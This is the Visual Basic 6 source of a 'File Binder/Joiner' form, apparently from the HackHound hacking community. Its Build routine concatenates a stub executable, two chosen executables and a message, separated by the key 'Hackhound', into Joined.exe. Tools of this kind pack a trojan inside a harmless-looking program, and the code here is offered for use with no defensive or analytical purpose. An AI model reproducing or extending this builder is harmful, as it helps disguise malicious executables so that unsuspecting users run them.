VERSION 5.00
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "COMDLG32.OCX"
Begin VB.Form Form1 
   BorderStyle     =   1  'Fest Einfach
   Caption         =   "Simple File Binder/Joiner"
   ClientHeight    =   2820
   ClientLeft      =   45
   ClientTop       =   375
   ClientWidth     =   4560
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   2820
   ScaleWidth      =   4560
   StartUpPosition =   2  'Bildschirmmitte
   Begin MSComDlg.CommonDialog CommonDialog3 
      Left            =   840
      Top             =   2640
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin VB.Frame Frame3 
      Caption         =   "Second file to Join"
      Height          =   735
      Left            =   120
      TabIndex        =   6
      Top             =   960
      Width           =   4335
      Begin VB.CommandButton Command3 
         Caption         =   "..."
         Height          =   255
         Left            =   3600
         TabIndex        =   8
         Top             =   360
         Width           =   615
      End
      Begin VB.TextBox Text3 
         Height          =   285
         Left            =   120
         TabIndex        =   7
         Top             =   360
         Width           =   3375
      End
   End
   Begin VB.Frame Frame2 
      Caption         =   "Message"
      Height          =   735
      Left            =   120
      TabIndex        =   4
      Top             =   1680
      Width           =   4335
      Begin VB.TextBox Text2 
         Height          =   285
         Left            =   120
         TabIndex        =   5
         Text            =   "visit HackHound.org"
         Top             =   360
         Width           =   3375
      End
   End
   Begin MSComDlg.CommonDialog CommonDialog2 
      Left            =   480
      Top             =   3000
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin MSComDlg.CommonDialog CommonDialog1 
      Left            =   1080
      Top             =   2880
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin VB.CommandButton Command1 
      Caption         =   "Build"
      Height          =   255
      Left            =   2880
      TabIndex        =   1
      Top             =   2520
      Width           =   1575
   End
   Begin VB.Frame Frame1 
      Caption         =   "File to Join"
      Height          =   735
      Left            =   120
      TabIndex        =   0
      Top             =   120
      Width           =   4335
      Begin VB.CommandButton Command2 
         Caption         =   "..."
         Height          =   255
         Left            =   3600
         TabIndex        =   3
         Top             =   360
         Width           =   615
      End
      Begin VB.TextBox Text1 
         Height          =   285
         Left            =   120
         TabIndex        =   2
         Top             =   360
         Width           =   3375
      End
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False

'======================================================
'Projekt  : File Binder/Joiner
'Author   : Inmate
'Use      : at your one Risk
'Credits  : Inmate
'For      : Coding Help :D
'=======================================================

Private Sub Command1_Click()
Dim buffer1 As String
Dim buffer2 As String
Dim splittkey As String

Open App.Path & "\Stub.exe" For _
Binary As #1
buffer1 = Space(LOF(1))
Get #1, , buffer1
Close #1

Open Text1.Text For _
Binary As #1
buffer2 = Space(LOF(1))
Get #1, , buffer2
Close #1

Dim buffer3 As String

Open Text3.Text For _
Binary As #1
buffer3 = Space(LOF(1))
Get #1, , buffer3
Close #1

splittkey = "Hackhound"
Dim message As String
message = Text2.Text

Open App.Path & "\Joined.exe" For _
Binary As #1
Put #1, , buffer1
Put #1, , splittkey
Put #1, , buffer2
Put #1, , splittkey
Put #1, , message
Put #1, , splittkey
Put #1, , buffer3
Put #1, , splittkey
Close #1

MsgBox "File succesfully createt", vbInformation, "Succesfully"



End Sub

Private Sub Command2_Click()
With CommonDialog1
.Filter = "Executables (*.exe)|*.exe"
.DialogTitle = "Choose a file"
.ShowOpen
Text1.Text = .FileName
End With





End Sub

Private Sub Command3_Click()
With CommonDialog3
.Filter = "Executables (*.exe)|*.exe"
.ShowOpen
Text3.Text = .FileName
End With



End Sub
